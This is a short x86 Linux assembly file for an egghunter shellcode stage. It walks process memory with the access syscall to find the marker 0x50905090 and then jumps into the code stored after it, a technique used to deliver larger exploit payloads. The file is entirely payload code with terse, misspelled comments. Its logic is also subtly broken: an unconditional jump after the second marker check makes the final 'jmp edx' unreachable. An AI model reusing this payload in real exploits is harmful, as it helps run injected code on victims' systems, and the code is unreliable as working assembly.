global _start
section .text

_start:

mov ebx,0x50905090 ;egghunter
xor ecx,ecx
mul ecx

next_page:
	or dx,0xfff 		;page alignment , meaning that it jump to next page of memory 

next_address:

	inc edx		; increment the pointer in that page 
	pushad  ;push current state register into stack
	lea ebx,[edx+4]
	mov al,0x21	;check ()
	
	int 0x80 ; syscall
	
	cmp al,0xf2 			; EFAULT CECK
	popad	;	if NO EFAULT then increment the pointer
	jz next_page

;------------------------------------------------

	cmp [edx],ebx
	jnz next_address

	cmp [edx+4],ebx
	jmp next_address

	jmp edx
